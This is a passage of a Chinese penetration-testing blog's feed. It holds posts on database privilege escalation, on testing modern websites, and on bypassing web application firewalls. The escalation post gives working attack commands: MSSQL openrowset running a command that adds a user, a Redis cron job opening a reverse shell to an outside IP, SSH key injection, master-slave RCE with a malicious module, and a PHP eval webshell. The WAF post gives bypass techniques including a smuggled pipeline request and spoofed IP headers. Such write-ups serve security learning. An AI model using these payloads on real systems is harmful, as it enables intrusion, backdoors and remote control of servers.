class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br></pre></td></tr></table></figure></li><li><p>查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br></pre></td></tr></table></figure></li><li><p>执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>沙盒模式SandBoxMode参数含义（默认是2）</p><p><code>0</code>：在任何所有者中禁止启用安全模式<br /><code>1</code>：为仅在允许范围内<br /><code>2</code>：必须在access模式下<br /><code>3</code>：完全开启</p><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE  DB是应用程序链接到SQL Server的的驱动程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">恢复配置（暂不执行）</span><br><span class="line">--</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure></blockquote><h3 id="oracle"><a class="markdownIt-Anchor" href="#oracle"></a> ORACLE</h3><p>测试：</p><ol><li>普通用户模式：拥有一个普通用户权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令</li><li>DBA用户模式：拥有DBA账户密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试</li><li>注入提升模式：拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</li></ol><p>注：</p><ul><li>jsp网站后门不用提权，默认就是system权限</li></ul><h4 id="oracle工具提权"><a class="markdownIt-Anchor" href="#oracle工具提权"></a> Oracle工具提权</h4><p>先使用sqlmap扫一下看是不是存在注入点，然后用rebeyond的工具干就完事了。</p><h3 id="redis"><a class="markdownIt-Anchor" href="#redis"></a> Redis</h3><p>Redis未授权漏洞：可以以root运行+使用内置指令+写入ssh密钥</p><p>常用指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 链接数据库</span><br><span class="line">redis-cli -h &lt;ip&gt; -p 6397 -a &lt;passwd&gt;</span><br><span class="line"># 查看信息</span><br><span class="line">info</span><br><span class="line"># 设置变量/获取变量</span><br><span class="line">set x &quot;test&quot;</span><br><span class="line">get x</span><br><span class="line"># 删除数据库</span><br><span class="line">flushall</span><br><span class="line"># 设置主从关系</span><br><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure><h4 id="计划任务反弹shell"><a class="markdownIt-Anchor" href="#计划任务反弹shell"></a> 计划任务反弹shell</h4><p>计划任务（路径：<code>/var/spool/cron</code>）。执行命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.80.137</span><br><span class="line">set  x   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.80.137/5555 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注意改一下IP端口就可以了，在自己的主机上：<code>nc -l -p 5555</code></p><h4 id="写入ssh-keygen"><a class="markdownIt-Anchor" href="#写入ssh-keygen"></a> 写入ssh-keygen</h4><p>条件：</p><ol><li>以root启动</li><li>开放ssh服务</li><li>未授权</li></ol><p>流程：</p><ol><li>在攻击机生成一个公钥文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/        #如果.ssh不存在的话,创建.ssh文件夹。</span><br><span class="line">ssh-keygen -t rsa     #执行完命令然后回车三次就结束了。</span><br><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure><ol start="2"><li>未授权或者弱口令访问redis服务，并写入公钥：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis -h 192.168.223.132      登录redis服务</span><br><span class="line">config set dir /root/.ssh/    #设置保存路径</span><br><span class="line">config set dbfilename authorized_keys    #设置保存文件名</span><br><span class="line">set x &quot;\n\n\n ??? \n\n\n&quot;    #将公钥写入x键，用&quot;\n\n\n&quot;包裹住公钥，并且跟公钥之间用空格隔开</span><br><span class="line">save    # 保存</span><br></pre></td></tr></table></figure><ol start="3"><li>用私钥进行登录：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa    #第一次登陆需要输入yes</span><br></pre></td></tr></table></figure><h4 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h4><p>为了缓解数据库压力，redis使用两个服务器，一个负责读一个负责写，来减轻流量压力。在两个redis服务器设置主从模式的时候，主机实例可以通过<code>FULLRESYNC</code>指令同步文件在从机实例上，然后在从机上加载。</p><p>如果同步了恶意so文件，则从机加载该文件，我们主机就可以执行拓展命令。</p><p>条件：</p><ol><li>服务器允许与其他IP发起TCP请求</li><li>允许主从复制</li><li>版本：4.x-5.0.5（可以编译so文件）</li></ol><p>流程：</p><ol><li>攻击机对受害机：<code>slaveof ip port</code></li><li>使用Redis-RCE工具获取受害机的反弹shell（使用nc模拟Redis主服务器，进行模拟Redis主从交互过程）</li></ol><p>实现：</p><ol><li><p>生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>攻击端执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.so</span><br><span class="line"></span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p><h4 id="低权限写入webshell"><a class="markdownIt-Anchor" href="#低权限写入webshell"></a> 低权限写入webshell</h4><p>流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 192.168.223.132</span><br><span class="line">192.168.223.132:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; set x &quot;&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h4 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h4><ol><li>绑定需要访问数据库IP，将127.0.0.1修改为需要访问该数据库的IP</li><li>修改帐号密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。</li><li>低权限运行Redis</li><li>禁止使用帐号密码登录</li></ol><h3 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSql</h3><p>PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。 提权利用的是一下漏洞。流程为：连接-利用漏洞-执行-提权。</p><p>判断权限去应用以下漏洞：一般名字为PostgreSql的用户就是高权限</p><h4 id="cve-2018-1058"><a class="markdownIt-Anchor" href="#cve-2018-1058"></a> CVE-2018-1058</h4><p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。（低权限用户用这个）</p><h4 id="cve-2019-9193"><a class="markdownIt-Anchor" href="#cve-2019-9193"></a> CVE-2019-9193</h4><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。（高权限提权）</p><h1 id="其他资源"><a class="markdownIt-Anchor" href="#其他资源"></a> 其他资源</h1><h2 id="复现注意"><a class="markdownIt-Anchor" href="#复现注意"></a> 复现注意</h2><ol><li>搭建数据库后要看防火墙是否把端口给拦截了，是的话重新开启</li></ol><h2 id="大马编写"><a class="markdownIt-Anchor" href="#大马编写"></a> 大马编写</h2><p><a href="https://blog.csdn.net/qq_53079406/article/details/125038306">https://blog.csdn.net/qq_53079406/article/details/125038306</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="提权" scheme="https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试需要注意的点</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/</id>
    <published>2023-06-14T01:08:03.000Z</published>
    <updated>2023-06-14T01:08:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。</p><ul><li>储存，数据库，网站程序等服务器高度分离</li><li>实现现代化前端技术， 如三大框架， html5新api， websocket</li><li>基于虚拟化技术的服务部署</li><li>使用现代后端框架，如ssm，think5，gin，django</li><li>外部服务高度集成</li><li>多种客户端，包括Android，Ios，windows</li></ul><p>篇幅有限， 不再列举，但相信读者应该能理解笔者的意思。</p><p>不属于现代化网站最典型的例子就是 下载cms，安装lnmp，直接安装网站程序。现在渗透教程基本都是基于不属于现代化网站的假设。</p><p>参考：<a href="https://blue-bird1.github.io/posts/newsitethink/">https://blue-bird1.github.io/posts/newsitethink/</a></p><h1 id="cdn反向代理"><a class="markdownIt-Anchor" href="#cdn反向代理"></a> CDN/反向代理</h1><p>使用了CDN将会隐藏真实IP， 导致常规端口扫描，弱口令扫描全部失效。但可以通过寻找真实ip来解决。反向代理则无解， 甚至可能只把代理服务器暴露于公网。敏感服务全在内网</p><p>对绕过CDN这个问题， 已经有了一定的研究。有了安全工具， 如<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p><h1 id="数据分离"><a class="markdownIt-Anchor" href="#数据分离"></a> 数据分离</h1><p>上传文件服务器分离，将导致上传webshell技术失效， 很显然文件服务器是不可能执行webshell的。 上传危害最多只能达到上传html</p><h1 id="websocket"><a class="markdownIt-Anchor" href="#websocket"></a> websocket</h1><p>之所以专门把websocket作为一点， 是因为感觉websocket属于盲区， burp，浏览器均不支持websocket的渗透测试。</p><h1 id="新的h5-api"><a class="markdownIt-Anchor" href="#新的h5-api"></a> 新的h5 api</h1><p>html5提供了新的api，但是这方面的安全问题还没有被开发人员重视。这个可以从hackone平台上的漏洞报告看出。例如<a href="https://hackerone.com/reports/398054">DOM Based XSS in www。hackerone。com via PostMessage</a> 。</p><p><code>postmessage</code>这类api的输入是不可控的，如果不进行控制， 就是安全问题。</p><h1 id="前后端分离"><a class="markdownIt-Anchor" href="#前后端分离"></a> 前后端分离</h1><p>使用三大框架(vue，react， angular)的前端， 对后端进行分离。 也就是不再将url参数直接渲染到html，而通过JavaScript操作。反射行xss全部失效，常规储存xss在框架的安全性下也变得渺茫。<strong>JavaScript操作带来的xss反而变为主流</strong>。这也对渗透测试人员阅读JavaScript代码带来了挑战，也带来了部分好处，由于在前端操作，后端暴露的接口将会更多。</p><h1 id="后端框架"><a class="markdownIt-Anchor" href="#后端框架"></a> 后端框架</h1><p>应用了框架后，简单注入全部失效，csrf部分失效， <code>id=x</code>这种低级注入消失。出现注入的点趋向<strong>二次注入</strong>， <strong>编码注入</strong>。 sqlmap是不提供原生支持的，所以一般都没用了，只适合找老漏洞。</p><h2 id="外部服务接入"><a class="markdownIt-Anchor" href="#外部服务接入"></a> 外部服务接入</h2><p>对某些功能不自行进行开发，使用其他公司的服务。这部分功能的安全性取决与该公司的安全水平， 不过真挖出漏洞就属于通用0day了。由于对接入服务的理解，接入处反而容易出现问题， 比如未预料的异常。</p><blockquote><p>接入开发: ???，这个问题你怎么不在服务上处理。</p><p>服务开发: ???，这个你怎么不在接入处处理</p></blockquote><h2 id="多服务端"><a class="markdownIt-Anchor" href="#多服务端"></a> 多服务端</h2><p>提供了多平台客户端， 这就对渗透测试多平台渗透能力发出了挑战。不但要会web，还要会安卓/ios渗透测试， 反编译(客户端总是会有一些未公开的api)。甚至还有IOT。</p><h2 id="风控"><a class="markdownIt-Anchor" href="#风控"></a> 风控</h2><p>好的风控系统基本阻止了邮箱/短信轰炸。对需要爆破的漏洞也降低了危害。</p><h2 id="xass"><a class="markdownIt-Anchor" href="#xass"></a> Xass</h2><p>Sass， Pass，Iass等各种服务公司不断涌现， 可能出现刚拿下shell，想内网渗透，发现实际上服务是在某Sass上。或者发现服务api是在Fass上的，根本没有服务器。这涉及到云安全。</p><p>参考：<a href="https://code84.com/837800.html">https://code84.com/837800.html</a></p><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/574e9258d109b3de5413a7bf5412bc8b820a4cf5.png@f_auto" alt="img" /></p><h2 id="虚拟化"><a class="markdownIt-Anchor" href="#虚拟化"></a> 虚拟化</h2><p>docker提供了优秀的服务分离，就算拿到了shell，也只是拿到了容器的shell。 容器虚拟化不一定安全，但是现在对这方面的研究还不是很多， 完全没有对绕过UAC的研究多。</p><h1 id="对安全教程的思考"><a class="markdownIt-Anchor" href="#对安全教程的思考"></a> 对安全教程的思考</h1><p>现在一些安全教程还是停留在旧时代， <code>' and 1=1</code>，<code>&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>固然是基础，挖掘思路也很重要。但是随着技术的发展， 渗透和开发技术也会走的更近， 新开发技术的爆发式增长，不可能像列中间件漏洞一样全部写出它们的渗透技术。就算有人写出来，等写出来黄花菜都凉了。安全教程应该更强调编程， 而不是培养只会用扫描器的驻场工程师。</p><h1 id="对安全工具的思考"><a class="markdownIt-Anchor" href="#对安全工具的思考"></a> 对安全工具的思考</h1><h2 id="扫描器"><a class="markdownIt-Anchor" href="#扫描器"></a> 扫描器</h2><p>随着技术的扩散，老式扫描器未来会面临失效。不支持浏览器模拟，只会抓a标签的扫描器， 对前后端分离无能为力。 基于流量和基于爬虫的扫描器会合并， 走向模拟获取流量进行扫描的模式对app的扫描器目前不支持对web的渗透测试。</p><h2 id="人工智能"><a class="markdownIt-Anchor" href="#人工智能"></a> 人工智能</h2><p>人工智能火热，各路安全公司都号称使用了AI技术(实际上怎么样就不知道了)。 除了使用AI技术对AI进行对抗， AI扫描器也在发展中。<br />这部分知识，我推荐兜哥的AI安全三部曲。</p><p>可以重复的渗透测试动作，AI都可以模拟。随着发展，只会重复的渗透人员会面临淘汰。也能让安全人员拿出精力进行安全研究，而不是重复性的测试。</p><h1 id="尾言"><a class="markdownIt-Anchor" href="#尾言"></a> 尾言</h1><p>现在正是承前启后的时代，旧的开发技术未被淘汰，新的开发技术正在发展， 谁会在这个时代引领潮流， 或是被淘汰。让我们拭目以待吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;储存，数据库，网站程序等服务器高度分离&lt;/</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透技巧" scheme="https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>WAF绕过-一般性绕过总结</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2023-06-12T07:03:07.000Z</published>
    <updated>2023-06-14T07:03:07.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/WAF%E7%BB%95%E8%BF%87-16867110382132.png" alt="WAF绕过" /></p><h1 id="基础绕过"><a class="markdownIt-Anchor" href="#基础绕过"></a> 基础绕过</h1><p>基础绕过一般是针对于payload的绕过，之前迪哥也在各个章节多少有提到过，这里做一些总结。参考文献有：</p><ol><li><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/07.WAF%E7%BB%95%E8%BF%87/01.WAF%E7%BB%95%E8%BF%87%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF.html">https://blog.gm7.org/个人知识库/01.渗透测试/07.WAF绕过/01.WAF绕过通用思路.html</a></li><li><a href="https://www.anquanke.com/post/id/212272#h2-11">https://www.anquanke.com/post/id/212272#h2-11</a></li></ol><h2 id="双写-大小写"><a class="markdownIt-Anchor" href="#双写-大小写"></a> 双写、大小写</h2><p>略</p><h2 id="编码"><a class="markdownIt-Anchor" href="#编码"></a> 编码</h2><p>这里要说一下：</p><ol><li><p>对于get方法来说，都是把数据串联在请求的url后面作为参数，然后对后面的参数进行URL-ENCODE编码。</p><blockquote><p>URL encode的过程就是把部分url作为字符，按照某种编码方式（如：utf-8，gbk等）编码成二进制的字节码，然后每个字节用一个包含3个字符的字 符串 “%xy” 表示，其中xy为该字节的两位十六进制表示形式。</p></blockquote></li><li><p>对于post方法来说，他将使用<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=字符集（GBK，utf-8等）&quot;/&gt;</code>中的<code>charset</code>字段定义编码。有四种方式：</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>application/x-www-form-urlencoded</td><td>在发送前编码所有字符（默认）</td></tr><tr><td>multipart/form-data</td><td>不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。</td></tr><tr><td>application/json</td><td></td></tr><tr><td>text/plain</td><td>空格转换为 “+” 加号，但不对特殊字符编码。</td></tr><tr><td>text/html</td><td>html编码</td></tr></tbody></table></li></ol><p>所以编码可以分为：</p><ol><li>URL编码</li><li>HTML编码</li><li>Base64编码</li><li>Unicode编码</li><li>十六进制编码</li><li><strong>其他后端会解析的编码</strong></li></ol><h2 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h2><h2 id="垃圾字符"><a class="markdownIt-Anchor" href="#垃圾字符"></a> 垃圾字符</h2><p>一般waf只会拦截一点点，只要超过这个长度就不检测，所以可以把Payload写在后面</p><h2 id="分块传输"><a class="markdownIt-Anchor" href="#分块传输"></a> 分块传输</h2><p>严格来说分块传输并不是一种编码解码机制，但是从实际效果来看，大家都把分块传输当成是一种特殊的编码解码办法。里面的很多技巧和编码解码有相似之处。分块传输，又称为Http Chunked。分块传输本身适用于解决大文件传输的问题，属于http标准的协议功能，所有的WEB服务器均支持分块传输。在绕过WAF的测试中，分块传输也是属于编码/解码的一种。只需要设置如下头即可。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。</p><p>burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter.git">https://github.com/c0ny1/chunked-coding-converter.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613140646587.png" alt="image-20230613140646587" style="zoom:67%;" /><h2 id="http"><a class="markdownIt-Anchor" href="#http"></a> HTTP</h2><h3 id="http-09"><a class="markdownIt-Anchor" href="#http-09"></a> HTTP 0.9</h3><p>HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果</p><h3 id="https与http"><a class="markdownIt-Anchor" href="#https与http"></a> HTTPS与HTTP</h3><p>http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护</p><h3 id="参数污染"><a class="markdownIt-Anchor" href="#参数污染"></a> 参数污染</h3><p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。注意每种服务器获取到的参数的位置不同，例如apache是最后一个。</p><p>注入样例：<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code>。apache获取到最后一个，而waf服务器（tomcat）只解析重复参数里面的前者。</p><table><thead><tr><th>Web环境</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP/Apache</td><td>$_GET(“par”)</td><td>last</td></tr><tr><td>JSP/Tomcat</td><td>Request.getParameter(“par”)</td><td>first</td></tr><tr><td>Perl(CGI)/Apache</td><td>Param(“par”)</td><td>first</td></tr><tr><td>Python/Apache</td><td>getvalue(“par”)</td><td>[“first”,“last”]</td></tr><tr><td><a href="http://ASP.NET/IIS">ASP.NET/IIS</a></td><td>Request.QueryString(“par”)</td><td>first,last</td></tr></tbody></table><h3 id="pipelinekeep-alive"><a class="markdownIt-Anchor" href="#pipelinekeep-alive"></a> Pipeline（keep-alive）</h3><p>http请求头部中有<code>Connection</code>这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成<code>keep-alive</code>，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束<code>Connection</code>为<code>close</code>为止</p><p>我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf</p><blockquote><p>记得把brupsuite自动更新<code>Content-Length</code>的勾去掉</p></blockquote><p>参考数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">a=1GET / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="http-charset"><a class="markdownIt-Anchor" href="#http-charset"></a> HTTP charset</h3><p>利用<code>Content-Type: xxx;charset=xxx</code>编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果。</p><p>需要了解上面的编码绕过相关知识，针对的是post。</p><h2 id="waf特性"><a class="markdownIt-Anchor" href="#waf特性"></a> Waf特性</h2><h3 id="云waf"><a class="markdownIt-Anchor" href="#云waf"></a> 云waf</h3><p>写host地址，直达真正的地址，不经过云转发即可！</p><h3 id="白名单绕过"><a class="markdownIt-Anchor" href="#白名单绕过"></a> 白名单绕过</h3><p>一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><h4 id="ip白名单"><a class="markdownIt-Anchor" href="#ip白名单"></a> IP白名单</h4><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypasswaf</p><blockquote><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p></blockquote><h4 id="静态资源"><a class="markdownIt-Anchor" href="#静态资源"></a> 静态资源</h4><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测</p><p>效率，不去检测这样一些静态文件名后缀的请求。</p><blockquote><p><a 